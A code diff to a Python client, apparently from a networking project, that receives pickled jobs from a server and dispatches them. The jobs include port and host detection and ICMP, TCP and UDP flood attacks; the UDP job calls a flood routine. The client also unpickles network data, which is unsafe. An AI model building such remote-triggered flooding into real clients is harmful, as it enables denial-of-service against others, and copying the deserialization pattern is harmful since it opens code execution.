@@ -1,7 +1,8 @@
 import socket
 import sys
 import pickle
-
+import os
+from FloodAttack import *
 
 class Client(object):
 
@@ -16,6 +17,9 @@ class Client(object):
         # Server Information
         self.SERVER = "127.0.0.1"
         self.PORT = 1233
+
+        #Needed Objects
+        self.udpAttack = FloodAttack()
 
         # Creating Client Socket Object
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -36,10 +40,12 @@ class Client(object):
             # Sets in_data to what is sent from the Server
             in_data = pickle.loads(in_data)
 
+            self.jobPrograms(in_data)
+
             # If JobList is sent from Server Print the Job List
             if type(in_data) == list:
                 for job in in_data:
-                    print(str(count)+":")
+                    print(str(count) + ":")
                     count += 1
                     for element in job:
                         print(element, end=" ")
@@ -55,6 +61,23 @@ class Client(object):
 
         # Closing the Socket Connection
         self.client.close()
+
+    def jobPrograms(self, in_data):
+        if in_data == "IP Online Detection":
+            print("Job 1")
+        elif in_data == "Subnet IP Online Detection":
+            print("Job 2")
+        elif in_data == "Specific Port Status Detection":
+            print("Job 3")
+        elif in_data == "All Port Status Detection":
+            print("Job 4")
+        elif in_data == "ICMP Flood Attack":
+            print("Job 5")
+        elif in_data == "TCP Flood Attack":
+            print("Job 6")
+        elif in_data == "UDP Flood Attack":
+            print("Job 7")
+            self.udpAttack.UDPAttack()
 
     def main(self):
         self.JobCorS()
